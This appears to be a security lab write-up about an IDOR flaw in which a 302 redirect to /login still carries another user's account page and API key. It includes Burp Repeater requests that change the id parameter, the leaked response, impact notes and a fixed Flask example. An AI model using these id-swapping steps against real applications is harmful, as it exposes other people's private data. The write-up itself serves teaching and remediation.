# Vulnerability Report: Sensitive Data Leakage in HTTP Redirect Response Body

* **Vulnerability Type:** Insecure Direct Object Reference (IDOR) (CWE-639) / Information Exposure Through Sent Data (CWE-201) / Execution with Unreachable Code / Missing Termination (CWE-670)

* **Severity:** High

* **Target Component:** Account Management Endpoint (`/my-account?id=`)

* **OWASP Top 10 Mapping:** A01:2021 – Broken Access Control

## 1. Executive Summary

A sensitive data exposure vulnerability was identified in the user account management endpoint (`/my-account`). When an authenticated user requests account details belonging to another user (`/my-account?id=carlos`), the server attempts an access control check and issues an HTTP `302 Found` redirect header targeting `/login`. However, because script execution is not terminated following the redirect call, the backend continues processing the request and appends the complete sensitive HTML profile body—including the target user's API key—to the HTTP response. Attackers using intercepting proxies can bypass the client-side redirect and read the leaked data.

## 2. Technical Analysis & Root Cause

The vulnerability is caused by incomplete control flow handling in server-side script execution during authorization failures.

### Execution Flow & Data Leakage Mechanics

1. **Authorization Failure Handling:** The server detects that `session.user_id != request.args.get('id')` and issues an HTTP redirect instruction (e.g., `response.redirect('/login')`).

2. **Missing Script Termination:** The controller routine does not return immediately after invoking the redirect method. Execution falls through to the view rendering logic.

3. **Client Parser Behavior:**
   * **Web Browsers:** Read `HTTP/1.1 302 Found`, ignore the body content, and automatically follow the `Location` header to `/login`.
   * **Security Proxies / Attackers:** Capture the raw TCP/HTTP response stream, reading the full rendered HTML body attached to the 302 response.

```
[ Attacker: wiener ]
          |
          | GET /my-account?id=carlos
          v
[ Application Server ]
          |
          | 1. Detects unauthorized access
          | 2. Appends header: Location: /login (302 Found)
          | 3. FAILS TO TERMINATE: Continues executing script!
          | 4. Fetches & renders Carlos's profile data into HTTP body
          v
[ HTTP Response Stream ]
  Header : HTTP/1.1 302 Found -> Location: /login
  Body   : <div>Your API key is: <code>[LEAKED_KEY]</code></div>
          |
          v
[ Proxy / Attacker Reads Response Body Before Browser Redirects ]

```

## 3. Proof of Concept (PoC)

1. Authenticate to the application using standard user credentials (`wiener:peter`).

2. Intercept the request to **My Account** using Burp Suite:

   ```
   GET /my-account?id=wiener HTTP/1.1
   Host: target-app.net
   Cookie: session=vX9z...
   
   ```

3. Send the request to **Burp Repeater** and modify the `id` parameter to target `carlos`:

   ```
   GET /my-account?id=carlos HTTP/1.1
   Host: target-app.net
   Cookie: session=vX9z...
   
   ```

4. Submit the request and examine the raw HTTP response headers and body:

   ```
   HTTP/1.1 302 Found
   Location: /login
   Content-Type: text/html; charset=utf-8
   Content-Length: 1420

   <!DOCTYPE html>
   <html>
   <head>...</head>
   <body>
       <h1>Your Account</h1>
       <p>Username: carlos</p>
       <p>Your API key is: <code>9kP3xZ7a...</code></p>
   </body>
   </html>
   
   ```

5. **Result:** Despite receiving an HTTP 302 redirect header, the raw HTTP response body leaks user `carlos`'s API key.

## 4. Impact

* **Horizontal Privilege Escalation:** Unprivileged users can access private data belonging to any registered user.

* **Bypass of Client-Side Navigation Controls:** Standard browser redirect behavior is rendered ineffective as an access control boundary.

* **Information Disclosure:** Complete exposure of user profile details, credentials, and API keys.

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Explicit Control Flow Termination:**
   Always terminate script execution immediately after issuing a redirect header (e.g., using `return`, `exit()`, or `die()`).

2. **Suppress Response Body Rendering on Redirection:**
   Do not attach sensitive business logic, database query results, or HTML body templates to redirect responses.

3. **Enforce Pre-Execution Authorization:**
   Perform access control validation *before* querying the database or constructing HTML response templates.

#### Secure Code Implementation Example (Python / Flask)

```
from flask import Flask, request, session, redirect, url_for, abort, render_template

app = Flask(__name__)

@app.route('/my-account')
def my_account():
    current_user = session.get('username')
    requested_id = request.args.get('id')
    
    # 1. Enforce access check BEFORE performing database lookup
    if not current_user or requested_id != current_user:
        # CRITICAL: Return the redirect immediately to prevent further execution!
        return redirect(url_for('login')), 302

    # 2. Database query and rendering executed ONLY if authorized
    user_data = db_get_profile(requested_id)
    return render_template('account.html', data=user_data)

```

## 6. References

* **CWE-639:** [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

* **CWE-201:** [Insertion of Sensitive Information Into Sent Data](https://cwe.mitre.org/data/definitions/201.html)

* **CWE-670:** [Always-Incorrect Control Flow Implementation](https://cwe.mitre.org/data/definitions/670.html)

* **OWASP:** [Broken Access Control Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)